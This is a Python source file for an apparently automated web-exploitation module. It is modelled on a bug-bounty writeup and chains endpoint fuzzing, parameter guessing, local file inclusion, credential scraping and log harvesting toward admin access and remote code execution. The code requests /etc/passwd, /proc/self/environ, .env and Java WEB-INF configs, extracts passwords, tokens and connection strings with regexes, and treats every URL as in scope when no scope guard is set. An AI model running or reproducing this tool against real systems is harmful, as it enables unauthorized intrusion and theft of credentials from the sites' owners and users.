"""
Deep Exploration — Don't stop at 404.

Inspired by the $40K bounty writeup where a hunter:
1. Fuzzed a 404 subdomain and found /admin/
2. Found /download endpoint with no params
3. Fuzzed to find the 'filename' parameter
4. Used LFI to read WEB-INF/web.xml (Java-specific)
5. Discovered log endpoint for RCE output
6. Extracted admin credentials from logs
7. Chained to full RCE via Groovy console

Key principle: A 404 is not the end — it's the beginning.

SCOPE SAFETY: Every URL is validated against scope before any request.
"""

import re
from typing import Dict, List, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from tools import ToolExecutor


class DeepExplorer:
    """
    Deep exploration engine that doesn't stop at first findings.

    Strategies:
    1. Never stop at 404 — fuzz the path anyway
    2. Find endpoints without params → fuzz for parameter names
    3. Detect tech stack → use tech-specific file paths
    4. Harvest log files for credentials and RCE output
    5. Chain findings sequentially (path traversal → cred leak → auth → RCE)
    """

    def __init__(self, tools: ToolExecutor = None, scope_guard=None):
        self.tools = tools or ToolExecutor()
        self.scope_guard = scope_guard

    # ─── Java-Specific Files ─────────────────────────────────────

    JAVA_FILES = [
        "/WEB-INF/web.xml",
        "/WEB-INF/classes/config.properties",
        "/WEB-INF/classes/application.properties",
        "/WEB-INF/sun-web.xml",
        "/WEB-INF/ibm-web-ext.xmi",
        "/META-INF/MANIFEST.MF",
        "/META-INF/context.xml",
        "/WEB-INF/lib/",
        "/WEB-INF/weblogic.xml",
        "/WEB-INF/jboss-web.xml",
        "/WEB-INF/ejb-jar.xml",
    ]

    # ─── Log File Endpoints ──────────────────────────────────────

    LOG_ENDPOINTS = [
        "/admin/incident-report",
        "/admin/download",
        "/admin/logs",
        "/admin/log",
        "/logs/",
        "/log/",
        "/admin/audit",
        "/admin/audit-log",
        "/actuator/logfile",
        "/actuator/loggers",
        "/server-logs",
        "/application-logs",
        "/admin/export/logs",
    ]

    # ─── Download Endpoints Without Params ───────────────────────

    DOWNLOAD_PATTERNS = [
        "/download", "/export", "/get", "/fetch", "/file",
        "/attachment", "/document", "/pdf", "/csv", "/excel",
        "/admin/download", "/admin/export", "/admin/get",
    ]

    # ─── Parameter Name Guessing ─────────────────────────────────

    PARAM_NAMES = [
        "filename", "file", "name", "path", "doc", "document",
        "pdf", "csv", "export", "download", "attachment",
        "resource", "src", "source", "target", "url",
        "inc", "include", "page", "template", "view",
    ]

    # ─── Credential Patterns ─────────────────────────────────────

    CREDENTIAL_PATTERNS = [
        # user:pass or user=pass
        r"(\w+)[:\s=]+([^\s,;]{6,})",
        # password: value
        r"password[:\s=]+\s*([^\s,;]{6,})",
        # admin credentials
        r"admin[:\s=]+([^\s,;]{6,})",
        # api keys
        r"(?:api[_-]?key|apikey|token)[:\s=]+\s*([^\s,;]{10,})",
        # database connection strings
        r"(?:jdbc|mysql|postgres|mongo)://[^\s]+",
        # md5 hashes (potential passwords)
        r"[a-f0-9]{32}:\w+",
        # base64 encoded passwords
        r"(?:password|passwd|pwd)[:\s=]+\s*[A-Za-z0-9+/=]{16,}",
    ]

    # ─── Scope Check ─────────────────────────────────────────────

    def _is_in_scope(self, url: str) -> bool:
        """Check if URL is within authorized scope."""
        if not self.scope_guard:
            return True  # No scope guard = allow all (for testing)
        from .scope_guard import OPSECLevel
        validation = self.scope_guard.validate_target(url, OPSECLevel.MODERATE)
        return validation.in_scope

    # ─── Main Exploration ────────────────────────────────────────

    async def explore_endpoint(
        self,
        base_url: str,
        endpoint: str,
        tech_stack: list = None,
    ) -> dict:
        """
        Deep explore a single endpoint. Don't stop at 404.

        Returns:
            {
                "endpoint": str,
                "findings": [...],
                "param_found": str,
                "tech_files": [...],
                "log_endpoints": [...],
                "credentials": [...],
                "chain_suggestions": [...],
            }
        """
        findings = []
        tech_files = []
        log_endpoints = []
        credentials = []
        chain_suggestions = []

        # Scope check before any request
        full_url = f"{base_url}{endpoint}"
        if not self._is_in_scope(full_url):
            return {
                "endpoint": endpoint,
                "findings": [],
                "tech_files": [],
                "log_endpoints": [],
                "credentials": [],
                "chain_suggestions": [],
            }

        # Step 1: Try the endpoint directly (even if 404)
        resp = await self._make_request(full_url)
        pr = self._parse_response(resp["raw"])

        findings.append({
            "type": "endpoint_discovery",
            "url": f"{base_url}{endpoint}",
            "status": pr["status"],
            "size": len(pr["body"]),
            "description": f"Endpoint returns {pr['status']} ({len(pr['body'])} bytes)",
        })

        # Step 2: If endpoint has no query params, fuzz for parameter names
        if "?" not in endpoint:
            param_result = await self._fuzz_for_params(base_url, endpoint)
            if param_result["param_found"]:
                findings.append(param_result)
                # Once we have the param, test LFI
                lfi_result = await self._test_lfi_with_param(
                    base_url, endpoint, param_result["param_found"], tech_stack
                )
                findings.extend(lfi_result.get("findings", []))
                tech_files.extend(lfi_result.get("tech_files", []))
                credentials.extend(lfi_result.get("credentials", []))

        # Step 3: Check for log endpoints
        for log_path in self.LOG_ENDPOINTS:
            resp = await self._make_request(f"{base_url}{log_path}")
            pr = self._parse_response(resp["raw"])
            if pr["status"] in (200, 301, 302, 307) and len(pr["body"]) > 100:
                log_endpoints.append({
                    "path": log_path,
                    "status": pr["status"],
                    "size": len(pr["body"]),
                })

        # Step 4: Chain suggestions
        if any(f.get("type") == "lfi" for f in findings):
            chain_suggestions.append({
                "chain": "lfi → credentials → auth bypass",
                "description": "LFI can read config/log files with credentials",
            })

        if log_endpoints and any(f.get("type") == "command_execution" for f in findings):
            chain_suggestions.append({
                "chain": "command_execution → log harvest",
                "description": "Execute commands, retrieve output from log files",
            })

        return {
            "endpoint": endpoint,
            "findings": findings,
            "tech_files": tech_files,
            "log_endpoints": log_endpoints,
            "credentials": credentials,
            "chain_suggestions": chain_suggestions,
        }

    # ─── Fuzz for Parameters ─────────────────────────────────────

    async def _fuzz_for_params(self, base_url: str, endpoint: str) -> dict:
        """
        When an endpoint has no params, fuzz to find the parameter name.
        Uses known valid files as payloads (like /admin/js/main.js).
        """
        # Known valid paths that exist in most web apps
        test_files = [
            "/js/main.js",
            "/js/app.js",
            "/css/style.css",
            "/index.html",
            "/robots.txt",
            "/admin/js/main.js",
            "/admin/css/style.css",
        ]

        for param in self.PARAM_NAMES:
            for test_file in test_files[:3]:
                url = f"{base_url}{endpoint}?{param}={test_file}"

                # Scope check before each request
                if not self._is_in_scope(url):
                    continue

                resp = await self._make_request(url)
                pr = self._parse_response(resp["raw"])

                # If we get content back, we found the right param + file combo
                if pr["status"] == 200 and len(pr["body"]) > 50:
                    return {
                        "type": "param_discovery",
                        "url": url,
                        "param_found": param,
                        "test_file": test_file,
                        "status": pr["status"],
                        "evidence": f"Found parameter '{param}' with file {test_file}",
                        "description": f"Discovered parameter '{param}' on {endpoint}",
                    }

        return {"type": "param_discovery", "param_found": None}

    # ─── LFI Testing with Discovered Param ───────────────────────

    async def _test_lfi_with_param(
        self,
        base_url: str,
        endpoint: str,
        param: str,
        tech_stack: list = None,
    ) -> dict:
        """
        Test LFI using discovered parameter and tech-specific files.
        """
        findings = []
        tech_files = []
        credentials = []

        # Determine which files to try based on tech stack
        files_to_try = self.JAVA_FILES.copy()

        if tech_stack:
            tech_str = " ".join(tech_stack).lower()
            if "python" in tech_str or "django" in tech_str or "flask" in tech_str:
                files_to_try.extend([
                    "/etc/passwd",
                    "/proc/self/environ",
                    "/app/config.py",
                    "/app/settings.py",
                ])
            elif "ruby" in tech_str or "rails" in tech_str:
                files_to_try.extend([
                    "/etc/passwd",
                    "/config/database.yml",
                    "/config/secrets.yml",
                ])
            elif "node" in tech_str or "express" in tech_str:
                files_to_try.extend([
                    "/etc/passwd",
                    "/app/.env",
                    "/app/config.js",
                ])
            elif "php" in tech_str or "laravel" in tech_str:
                files_to_try.extend([
                    "/etc/passwd",
                    "/.env",
                    "/config/database.php",
                ])

        for file_path in files_to_try:
            url = f"{base_url}{endpoint}?{param}={file_path}"

            # Scope check before each request
            if not self._is_in_scope(url):
                continue

            resp = await self._make_request(url)
            pr = self._parse_response(resp["raw"])

            if pr["status"] == 200 and len(pr["body"]) > 20:
                # Check for sensitive content
                body = pr["body"]
                creds = self._extract_credentials(body)

                if creds:
                    credentials.extend(creds)
                    findings.append({
                        "type": "credential_leak",
                        "url": url,
                        "file": file_path,
                        "credentials": creds,
                        "severity": "critical",
                        "evidence": f"Found {len(creds)} credentials in {file_path}",
                        "description": f"Credentials found in {file_path}",
                    })
                elif "root:" in body or "<?xml" in body.lower() or "servlet" in body.lower():
                    findings.append({
                        "type": "lfi",
                        "url": url,
                        "file": file_path,
                        "severity": "high",
                        "evidence": f"Successfully read {file_path} ({len(body)} bytes)",
                        "description": f"LFI via {param} parameter",
                    })
                    tech_files.append(file_path)

        return {
            "findings": findings,
            "tech_files": tech_files,
            "credentials": credentials,
        }

    # ─── Credential Extraction ───────────────────────────────────

    def _extract_credentials(self, content: str) -> list:
        """Extract potential credentials from content."""
        creds = []

        for pattern in self.CREDENTIAL_PATTERNS:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match.groups()) >= 2:
                    user = match.group(1)
                    secret = match.group(2)
                    # Filter out common false positives
                    if user.lower() not in ("http", "https", "ftp", "ssh", "ssl", "www"):
                        creds.append({
                            "type": "credential",
                            "username": user,
                            "secret": secret,
                            "source": "file_content",
                        })
                elif len(match.groups()) == 1:
                    secret = match.group(1)
                    if len(secret) > 8:
                        creds.append({
                            "type": "credential",
                            "username": "unknown",
                            "secret": secret,
                            "source": "file_content",
                        })

        # Check for MD5 hashes with potential passwords
        md5_matches = re.findall(r"([a-f0-9]{32}):(\w+)", content)
        for md5, potential_pass in md5_matches:
            creds.append({
                "type": "md5_hash",
                "hash": md5,
                "potential_password": potential_pass,
                "source": "file_content",
            })

        return creds[:10]  # Limit to avoid noise

    # ─── Log Harvesting for RCE Output ───────────────────────────

    async def harvest_logs_for_rce(
        self,
        base_url: str,
        log_endpoints: list,
    ) -> list:
        """
        When RCE is achieved but output isn't visible, harvest logs.
        This is the technique from the $40K writeup.
        """
        harvested = []

        for log in log_endpoints:
            url = f"{base_url}{log['path']}"
            resp = await self._make_request(url)
            pr = self._parse_response(resp["raw"])

            if pr["status"] == 200:
                body = pr["body"]
                # Look for command output patterns
                if any(marker in body for marker in ("uid=", "root:", "www-data", "admin")):
                    harvested.append({
                        "type": "rce_output",
                        "url": url,
                        "evidence": body[:1000],
                        "description": "RCE output found in log file",
                    })

                # Look for credentials in logs
                creds = self._extract_credentials(body)
                if creds:
                    harvested.append({
                        "type": "log_credentials",
                        "url": url,
                        "credentials": creds,
                        "description": f"Found {len(creds)} credentials in logs",
                    })

        return harvested

    # ─── Chain Builder ───────────────────────────────────────────

    def build_chains(self, findings: list) -> list:
        """
        Build attack chains from sequential findings.
        Like the writeup: path traversal → credentials → auth → RCE
        """
        chains = []

        # Chain 1: LFI → Credentials → Auth Bypass
        lfi_findings = [f for f in findings if f.get("type") == "lfi"]
        cred_findings = [f for f in findings if f.get("type") == "credential_leak"]

        if lfi_findings and cred_findings:
            chains.append({
                "name": "LFI to Auth Bypass",
                "steps": [
                    {"step": 1, "finding": lfi_findings[0], "action": "Read config/log files via LFI"},
                    {"step": 2, "finding": cred_findings[0], "action": "Extract admin credentials"},
                    {"step": 3, "action": "Login with discovered credentials"},
                ],
                "severity": "critical",
                "description": "Chain: LFI → credential extraction → admin access",
            })

        # Chain 2: LFI → Java Config → Hidden Endpoints
        java_files = [f for f in findings if f.get("file", "").endswith(".xml")]
        if lfi_findings and java_files:
            chains.append({
                "name": "LFI to Hidden Endpoints",
                "steps": [
                    {"step": 1, "finding": lfi_findings[0], "action": "Read WEB-INF/web.xml"},
                    {"step": 2, "finding": java_files[0], "action": "Discover hidden endpoints from config"},
                    {"step": 3, "action": "Explore newly discovered endpoints"},
                ],
                "severity": "high",
                "description": "Chain: LFI → Java config → hidden endpoint discovery",
            })

        # Chain 3: Command Execution → Log Harvest
        cmd_findings = [f for f in findings if f.get("type") == "command_execution"]
        log_findings = [f for f in findings if f.get("type") == "log_endpoint"]

        if cmd_findings and log_findings:
            chains.append({
                "name": "RCE via Log Harvest",
                "steps": [
                    {"step": 1, "finding": cmd_findings[0], "action": "Execute command (output not visible)"},
                    {"step": 2, "finding": log_findings[0], "action": "Download fresh log file"},
                    {"step": 3, "action": "Extract RCE output from logs"},
                ],
                "severity": "critical",
                "description": "Chain: blind RCE → log file → output extraction",
            })

        return chains

    # ─── Helpers ─────────────────────────────────────────────────

    async def _make_request(self, url: str, timeout: int = 10) -> dict:
        cmd = ["curl", "-s", "-L", "-i", "--max-time", str(timeout)]
        cmd.append(url)

        result = await self.tools.run("curl", cmd[1:])
        return {
            "raw": result.get("stdout", ""),
            "success": result.get("success", False),
        }

    def _parse_response(self, raw: str) -> dict:
        parts = raw.split("\r\n\r\n", 1)
        headers_raw = parts[0] if parts else ""
        body = parts[1] if len(parts) > 1 else ""

        status_match = re.search(r"HTTP/\d\.\d\s+(\d+)", headers_raw)
        status = int(status_match.group(1)) if status_match else 0

        headers = {}
        for line in headers_raw.split("\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        return {"status": status, "headers": headers, "body": body[:5000]}
